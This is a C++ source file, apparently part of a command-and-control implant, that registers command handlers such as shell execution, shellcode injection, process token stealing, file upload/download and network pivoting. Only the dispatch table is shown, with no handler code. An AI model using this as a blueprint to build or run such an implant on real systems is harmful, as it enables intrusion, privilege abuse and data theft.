#include "Command.h"

std::vector<ImplantCommand> g_CommandRegistry = {
    { "exit", CommandExit },
    { "channel.switch", CommandChannelSwitch },
    { "channel.register", CommandChannelRegister },
    { "channel.remove", CommandChannelRemove },
    { "ps", CommandPs },
    { "cd", CommandCd },
    { "cp", CommandCp },
    { "download", CommandDownload },
    { "upload", CommandUpload },
    { "shell", CommandShell },
    { "run", CommandRun },
    { "execute-assembly", CommandExecuteAssembly },
    { "job.list", CommandJobList },
    { "job.stop", CommandJobStop },
    { "inline-execute", CommandInlineExecute },
    { "inject-shellcode", CommandInjectShellcode },
    { "token.info", CommandTokenInfo },         // show current security tokens
    { "token.rev2self", CommandTokenRev2Self }, // revert token
    { "token.make", CommandTokenMake },         // create token
    { "token.steal", CommandTokenSteal },       // steal process token
    { "pivot.connect", CommandPivotConnect },
    { "pivot.request", CommandPivotRequest },
};
